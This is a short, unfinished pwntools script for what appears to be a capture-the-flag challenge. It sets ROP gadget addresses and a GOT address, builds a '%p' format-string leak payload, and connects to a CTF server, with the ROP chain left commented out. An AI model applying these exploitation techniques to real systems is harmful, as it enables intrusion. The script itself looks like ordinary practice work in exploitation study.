# Import everything in the pwntools namespace
from pwn import *


def get_data(conn, token):
    return conn.recvuntil(token, timeout=2, drop=True)


context(os='linux', arch='amd64')

call_flag   = 0x0000000000401186
pop_rdi     = 0x0000000000401343
got_addr    = 0x600c50

payload_leak = "A"*8 + "%p" * 30 

#payload += p64(pop_rdi)
#payload += p64(got_addr)
#payload += p64(call_flag)
#sh = process('./no_canary')
#sh.sendlineafter('name? ', payload)
#sh.interactive()
conn = remote('shell.actf.co', 20701)
data_leak =  conn.recvuntil("me? ", timeout=2, drop=True)
print(data_leak)

#canary = 
conn.interactive()
